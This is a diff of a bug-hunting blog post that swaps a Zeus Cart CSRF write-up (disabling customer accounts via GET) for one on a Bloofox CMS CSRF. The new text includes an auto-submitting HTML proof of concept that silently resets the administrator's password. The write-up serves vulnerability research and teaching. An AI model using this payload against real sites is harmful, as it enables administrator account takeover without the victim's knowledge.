@@ -16,62 +16,60 @@ tags:
 
 # i. Introduction
 
-Zeus Cart in general, is a PHP Shopping Cart. As of today, ZeusCart is nearly five years old, though it is still a great application for learning how to find bugs.
+Bloofox is a Content Management System (CMS), which allows users to manage websites. Bloofox is very simple, yet powerful.
 
-As with many shopping cart software, Zeus Cart is riddled with bugs. While practicing my bug hunting technique, I managed to find a CSRF, which allowed an attacker to disable customer accounts.
+As with any CMS, Bloofox is riddled with bugs. As soon as functions such as managing users, website content; it opens up a huge attack surface on the application.
 
-Once a customer account is disabled, it tells the customer that they have an invalid password, instead of letting them know they were banned.
+On May 21, 2018, Bloofox CMS has reached its end of life, which means any existing bugs will not be fixed, and all support will be stopped.
 
 # ii. Summary
 
-According to OWASP, Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
+To read an in-depth summary of how CSRF works, and how it can be protected against, check out the summary section of this post: https://m-q-t.github.io/notes/zeuscart-csrf/
 
-In basic terms, once an application has a cookie set in the user's browser, the browser will automatically submit the cookie to the applicatoin in every request. Which means if an attacker creates a HTML form that is auto submitted when a user clicks on it, they will be able to submit actions on behalf of the user.
+# iii. Exploiting Bloofox
 
-To prevent CSRF, an application can use tokens. The application will issue a token on every action in the request. The token usually lives in a hidden input in the HTML. Therefore when the user submits a form, the application makes sure the token matches what was issued on the HTML.
+It is a great practice for an application to issue CSRF tokens whenever a form is submitted.
 
-# iii. Exploiting Zeus Cart
+However, in this case Bloofox can avoid the CSRF by not having to issue tokens.
 
-Once in the admin panel, under Customers, we are able to see all the registered customers.
+How? Bloofox does not make the Administrator confirm their old password when setting a new password for themselves. Which makes a bit of sense, due to the fact if the user is an Administrator they should be able to change passwords.
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/zeus-cart/customers.png)
+Though for a high privileged account such as an Administrator, it is generally a great idea to have the administrator confirm their old password when changing it. If the administrator truly forgot their password and cannot change it, they can always go through the backend (such as updating their password in the database).
 
-When clicking the "Active" button under the Status column, and intercepting the request we can see:
+Due to Bloofox not having the Administrator confirm their password, and not issuing any tokens to make sure the form is valid, an attacker can send a link to the Administrator. Once the link is clicked, the request will be sent to the application to change the password to the attacker's choice.
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/zeus-cart/request.png)
+PoC.html:
+```text
+<html>
+<body>
+<form method="post" action="http://localhost/admin/index.php?mode=user&action=edit" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="admin">
+    <input type="hidden" name="password" value="CHANGEPASSWORD">
+    <input type="hidden" name="pwdconfirm" value="CHANGEPASSWORD">
+    <input type="hidden" name="3" value="Admin">
+    <input type="hidden" name="blocked" value="0">
+    <input type="hidden" name="deleted" value="0">
+    <input type="hidden" name="status" value="1">
+    <input type="hidden" name="login_page" value="0">
+    <input type="hidden" name="userid" value="1">
+    <input type="hidden" name="send" value="Save">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+```
 
-It is sending a GET request to disable an account with the ID of 1. Which we can infer is the first customer registered in the database.
+When the Administrator clicks the link, they will see a blank page but a request will be sent to the server, and change the Administrator's password to whatever they set in the form.
 
-As you may notice, in the request there is no parameter that validates any sort of tokens.
-
-To abuse this, an attacker can create an HTML page that looks blank, but when the admin clicks on the page, it will send a GET request which in turn will deactivate an account.
-
-From what seems a blank page, there is actually a request going on in the background.
-
-![Screenshot]({{ site.baseurl }}/images/posts/2017/zeus-cart/blank.png)
-
-We can see what's going on by viewing the source.
-
-![Screenshot]({{ site.baseurl }}/images/posts/2017/zeus-cart/source.png)
-
-As we can see, the page create a request by trying to fetch an image, and executes the request in the background.
-
-You can view the PoC on: https://www.exploit-db.com/exploits/46027
-
-Here it is in action:
-
-![Screenshot]({{ site.baseurl }}/images/posts/2017/zeus-cart/csrf.gif)
-
-## https://www.exploit-db.com/exploits/46027
 
 # iv. Conclusion
 
-In conclusion, Zeus Cart is a great way to practice hunting, and building your foundation. Though keep in mind, the software is reaching it's sixth year since it has last been updated. Which means today, applications are more secure as new techniques and methods have been developed. With all that in mind, developers tend to make mistakes and overlook certain functions of an application. Even today the same bugs found in this six year old software, are found on some of the biggest websites.
+In conclusion, like I have mentioned earlier, older applications are a great way to practice some bug hunting methodology and build foundation. It is true that newer applications implement more secure practices, though the foundation in the end is pretty much the same.
 
 
 Thank you for reading.
 
 ~~~
 Sources:
-https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+https://m-q-t.github.io/notes/zeuscart-csrf/
 ~~~
